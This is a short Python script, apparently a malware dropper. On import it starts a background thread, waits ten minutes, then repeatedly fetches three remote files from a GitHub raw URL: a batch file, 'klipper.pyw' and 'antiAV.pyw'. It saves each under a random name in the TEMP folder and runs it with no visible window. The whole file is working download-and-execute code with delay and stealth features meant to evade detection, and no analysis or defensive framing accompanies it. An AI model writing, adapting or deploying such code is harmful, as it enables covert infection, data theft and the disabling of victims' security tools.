import subprocess
import os
import urllib.request
import time
import threading
import uuid

def main():
    TEMP = os.getenv('TEMP')

    time.sleep(600)

    url = 'https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/main.bat'
    path = os.path.join(TEMP, f'{uuid.uuid4().hex}.bat')
    while True:
        try:
            with urllib.request.urlopen(url) as res, open(path, 'wb') as f:
                f.write(res.read())
            subprocess.Popen(path, creationflags=subprocess.CREATE_NO_WINDOW)
            break
        except:
            time.sleep(3)

    url = 'https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/klipper.pyw'
    path = os.path.join(TEMP, f'{uuid.uuid4().hex}.pyw')
    while True:
        try:
            with urllib.request.urlopen(url) as res, open(path, 'wb') as f:
                f.write(res.read())
            subprocess.Popen(path, creationflags=subprocess.CREATE_NO_WINDOW)
            break
        except:
            time.sleep(3)

    url = 'https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/antiAV.pyw'
    path = os.path.join(TEMP, f'{uuid.uuid4().hex}.pyw')
    while True:
        try:
            with urllib.request.urlopen(url) as res, open(path, 'wb') as f:
                f.write(res.read())
            subprocess.Popen(path, creationflags=subprocess.CREATE_NO_WINDOW)
            break
        except:
            time.sleep(3)

threading.Thread(target=main).start()
